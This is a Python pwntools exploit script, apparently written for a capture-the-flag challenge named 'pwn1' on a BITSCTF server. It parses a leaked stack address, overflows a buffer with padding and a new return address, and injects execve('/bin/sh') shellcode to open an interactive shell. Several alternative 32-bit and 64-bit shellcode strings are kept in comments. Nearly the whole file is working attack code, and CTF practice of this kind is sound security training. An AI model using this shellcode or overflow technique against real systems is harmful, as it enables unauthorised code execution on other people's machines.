from pwn import *
"""===============    Configuration    ================"""
pwnName = "pwn1"
local = True
libName = ''
host, port = 'bitsctf.bits-quark.org', 1337
context.endian = 'little'
context.arch = 'amd64'
context.os = "linux"
context.log_level = 10
context.terminal = ['tmux', 'splitw', '-h']
print"="*40 + '\n'
"""====== =============================================="""
binary = ELF(pwnName)
libc = None
rop = None
canary= 0

if local:
    r = process("./" +pwnName);
    gdb.attach(r)
else:
    r = remote(host, port)

address = int(r.recvline().split("0x")[1].strip(), 16)
address += 20
#address = int("0x7fffffffdd00", 16) +30

#address = "\x00\xdd\xff\xff\xff\x7f"
#noaslr
#address = p64(0x7fffffffce60)   #remote
#address = p64(0x7fffffffe620)   #local
#address = p64(0x7fffffffcda0) # python
#address = p64(0x7fffffffcd30)a


sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#sc = "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05"
#sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#sc = "\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#sc = "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80"
#sc = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
skipLen = 24
#23 for sc
#1 for random a
#6 for return address
print len(sc)
payload = "a" * skipLen + p64(address) + sc
with open('input', 'w') as f:
    f.write(payload)
print payload
r.sendline(payload)

r.interactive()

